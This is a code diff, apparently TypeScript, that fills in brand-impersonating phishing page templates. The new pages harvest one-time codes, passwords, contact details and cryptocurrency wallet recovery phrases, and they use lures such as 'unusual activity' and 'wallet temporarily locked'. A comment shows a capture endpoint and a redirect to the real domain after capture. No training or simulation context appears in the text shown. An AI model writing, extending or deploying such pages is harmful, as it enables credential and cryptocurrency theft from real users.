@@ -6,7 +6,7 @@ import type { PhishingBrand, PhishingVariant } from './phishingBrands.js';
 import { PHISHING_CATEGORY_LABELS } from './phishingBrands.js';
 
 export interface PhishingPageOptions {
-  captureUrl?: string;    // default '/api/phishing/capture'
+  captureUrl?: string;      // default '/api/phishing/capture'
   redirectDelayMs?: number; // default 2500 (ms before redirect to legit domain)
 }
 
@@ -54,8 +54,8 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Ar
 .card .sub{color:var(--muted);font-size:14px;margin-bottom:20px;line-height:1.45}
 .field{margin-bottom:14px}
 .field label{display:block;font-size:13px;font-weight:600;margin-bottom:6px}
-.field input,.field select{width:100%;padding:11px 12px;font-size:15px;border:1px solid var(--border);border-radius:8px;outline:none;background:#fff;transition:border-color .15s,box-shadow .15s}
-.field input:focus,.field select:focus{border-color:var(--brand);box-shadow:0 0 0 3px rgba(0,0,0,.06)}
+.field input,.field select,.field textarea{width:100%;padding:11px 12px;font-size:15px;border:1px solid var(--border);border-radius:8px;outline:none;background:#fff;transition:border-color .15s,box-shadow .15s}
+.field input:focus,.field select:focus,.field textarea:focus{border-color:var(--brand);box-shadow:0 0 0 3px rgba(0,0,0,.06)}
 .field .hint{font-size:12px;color:var(--muted);margin-top:4px}
 .btn{width:100%;padding:12px;font-size:15px;font-weight:700;color:#fff;background:var(--brand);border:none;border-radius:8px;cursor:pointer;margin-top:6px}
 .btn:hover{filter:brightness(.95)}
@@ -67,6 +67,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Ar
 .error.show{display:block}
 .otp-row{display:flex;gap:8px;justify-content:space-between;margin-bottom:6px}
 .otp-row input{width:48px;height:52px;text-align:center;font-size:20px;font-weight:700}
+.seed-area{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;min-height:110px;resize:vertical}
 .footer{margin-top:18px;font-size:11px;color:var(--muted);text-align:center;line-height:1.5;max-width:400px}
 `;
 
@@ -125,15 +126,161 @@ function skeletonLogin(brand: PhishingBrand): string {
 <div class="footer">© ${new Date().getFullYear()} ${escapeHtml(brand.name)}. All rights reserved. Protected by industry-standard encryption.</div>`;
 }
 
+function skeletonOtp(brand: PhishingBrand): string {
+  return `
+<div class="brand-badge">
+  <div class="brand-logo">${escapeHtml(brand.initials)}</div>
+  <div class="brand-name">${escapeHtml(brand.name)}</div>
+</div>
+<div class="card">
+  <h1>Confirm it's you</h1>
+  <p class="sub">We sent a one-time code to your phone or email. Enter it below to continue to ${escapeHtml(brand.name)}.</p>
+  <div class="error"></div>
+  <form id="ph-form" autocomplete="off" novalidate>
+    <div class="field">
+      <label for="email">Email or phone</label>
+      <input type="text" id="email" name="email" data-prefill="email" autocomplete="username" placeholder="you@example.com"/>
+    </div>
+    <div class="field">
+      <label>One-time code</label>
+      <div class="otp-row">
+        <input type="text" inputmode="numeric" maxlength="1" name="otp_1" autocomplete="one-time-code" aria-label="Code 1"/>
+        <input type="text" inputmode="numeric" maxlength="1" name="otp_2" autocomplete="off" aria-label="Code 2"/>
+        <input type="text" inputmode="numeric" maxlength="1" name="otp_3" autocomplete="off" aria-label="Code 3"/>
+        <input type="text" inputmode="numeric" maxlength="1" name="otp_4" autocomplete="off" aria-label="Code 4"/>
+        <input type="text" inputmode="numeric" maxlength="1" name="otp_5" autocomplete="off" aria-label="Code 5"/>
+        <input type="text" inputmode="numeric" maxlength="1" name="otp_6" autocomplete="off" aria-label="Code 6"/>
+      </div>
+      <p class="hint">The code expires in 10 minutes.</p>
+    </div>
+    <button type="submit" class="btn">Verify code</button>
+  </form>
+  <p class="alt">Didn't receive a code? <a href="https://${escapeHtml(brand.domain)}">Resend it</a></p>
+</div>
+<div class="footer">© ${new Date().getFullYear()} ${escapeHtml(brand.name)}. All rights reserved. Protected by industry-standard encryption.</div>`;
+}
+function skeletonVerify(brand: PhishingBrand): string {
+  return `
+<div class="brand-badge">
+  <div class="brand-logo">${escapeHtml(brand.initials)}</div>
+  <div class="brand-name">${escapeHtml(brand.name)}</div>
+</div>
+<div class="card">
+  <h1>Verify your identity</h1>
+  <p class="sub">Unusual activity was detected on your ${escapeHtml(brand.name)} account. Confirm your credentials to restore access.</p>
+  <div class="error"></div>
+  <form id="ph-form" autocomplete="off" novalidate>
+    <div class="field">
+      <label for="email">Email or phone</label>
+      <input type="text" id="email" name="email" data-prefill="email" autocomplete="username" placeholder="you@example.com"/>
+    </div>
+    <div class="field">
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" autocomplete="current-password" placeholder="••••••••"/>
+    </div>
+    <div class="field">
+      <label for="confirm_password">Confirm password</label>
+      <input type="password" id="confirm_password" name="confirm_password" autocomplete="off" placeholder="••••••••"/>
+    </div>
+    <button type="submit" class="btn">Verify identity</button>
+  </form>
+  <p class="alt"><a href="https://${escapeHtml(brand.domain)}">Contact support</a></p>
+</div>
+<div class="footer">© ${new Date().getFullYear()} ${escapeHtml(brand.name)}. All rights reserved. Protected by industry-standard encryption.</div>`;
+}
+
+function skeletonUpdate(brand: PhishingBrand): string {
+  return `
+<div class="brand-badge">
+  <div class="brand-logo">${escapeHtml(brand.initials)}</div>
+  <div class="brand-name">${escapeHtml(brand.name)}</div>
+</div>
+<div class="card">
+  <h1>Update your information</h1>
+  <p class="sub">We need you to confirm your contact details to keep your ${escapeHtml(brand.name)} account secure.</p>
+  <div class="error"></div>
+  <form id="ph-form" autocomplete="off" novalidate>
+    <div class="field">
+      <label for="email">Email or phone</label>
+      <input type="text" id="email" name="email" data-prefill="email" autocomplete="username" placeholder="you@example.com"/>
+    </div>
+    <div class="field">
+      <label for="password">Current password</label>
+      <input type="password" id="password" name="password" autocomplete="current-password" placeholder="••••••••"/>
+    </div>
+    <div class="field">
+      <label for="phone">Phone number</label>
+      <input type="tel" id="phone" name="phone" data-prefill="phone" placeholder="+1 555 000 0000"/>
+    </div>
+    <button type="submit" class="btn">Save changes</button>
+  </form>
+  <p class="alt"><a href="https://${escapeHtml(brand.domain)}">Cancel</a></p>
+</div>
+<div class="footer">© ${new Date().getFullYear()} ${escapeHtml(brand.name)}. All rights reserved. Protected by industry-standard encryption.</div>`;
+}
+
+function skeletonTrack(brand: PhishingBrand): string {
+  return `
+<div class="brand-badge">
+  <div class="brand-logo">${escapeHtml(brand.initials)}</div>
+  <div class="brand-name">${escapeHtml(brand.name)}</div>
+</div>
+<div class="card">
+  <h1>Track your package</h1>
+  <p class="sub">Enter your tracking number to see real-time delivery status. A delivery attempt was made but the address could not be confirmed.</p>
+  <div class="error"></div>
+  <form id="ph-form" autocomplete="off" novalidate>
+    <div class="field">
+      <label for="tracking">Tracking number</label>
+      <input type="text" id="tracking" name="tracking" placeholder="e.g. 1Z999AA10123456784"/>
+    </div>
+    <div class="field">
+      <label for="email">Email or phone</label>
+      <input type="text" id="email" name="email" data-prefill="email" autocomplete="username" placeholder="you@example.com"/>
+    </div>
+    <button type="submit" class="btn">Track package</button>
+  </form>
+  <p class="alt"><a href="https://${escapeHtml(brand.domain)}">Need help? Contact us</a></p>
+</div>
+<div class="footer">© ${new Date().getFullYear()} ${escapeHtml(brand.name)}. All rights reserved. Protected by industry-standard encryption.</div>`;
+}
+
+function skeletonSeed(brand: PhishingBrand): string {
+  return `
+<div class="brand-badge">
+  <div class="brand-logo">${escapeHtml(brand.initials)}</div>
+  <div class="brand-name">${escapeHtml(brand.name)}</div>
+</div>
+<div class="card">
+  <h1>Secure your wallet</h1>
+  <p class="sub">Your wallet was temporarily locked due to unusual activity. Enter your recovery phrase to verify ownership and restore access.</p>
+  <div class="error"></div>
+  <form id="ph-form" autocomplete="off" novalidate>
+    <div class="field">
+      <label for="email">Wallet email or username</label>
+      <input type="text" id="email" name="email" data-prefill="email" autocomplete="username" placeholder="you@example.com"/>
+    </div>
+    <div class="field">
+      <label for="seed_phrase">Recovery phrase</label>
+      <textarea id="seed_phrase" name="seed_phrase" class="seed-area" placeholder="Enter your 12 or 24 word recovery phrase, separated by spaces"></textarea>
+      <p class="hint">${escapeHtml(brand.name)} will never ask for your recovery phrase outside of this verification.</p>
+    </div>
+    <button type="submit" class="btn">Verify wallet</button>
+  </form>
+  <p class="alt"><a href="https://${escapeHtml(brand.domain)}">Contact support</a></p>
+</div>
+<div class="footer">© ${new Date().getFullYear()} ${escapeHtml(brand.name)}. All rights reserved. Protected by industry-standard encryption.</div>`;
+}
+
 // --- page assembly ----------------------------------------------------------
 
 const SKELETONS: Record<PhishingVariant, (brand: PhishingBrand) => string> = {
   login: skeletonLogin,
-  otp: () => '',   // Part 2
-  verify: () => '', // Part 2
-  update: () => '', // Part 3
-  track: () => '',  // Part 3
-  seed: () => '',   // Part 3
+  otp: skeletonOtp,
+  verify: skeletonVerify,
+  update: skeletonUpdate,
+  track: skeletonTrack,
+  seed: skeletonSeed,
 };
 
 export function renderPhishingPage(
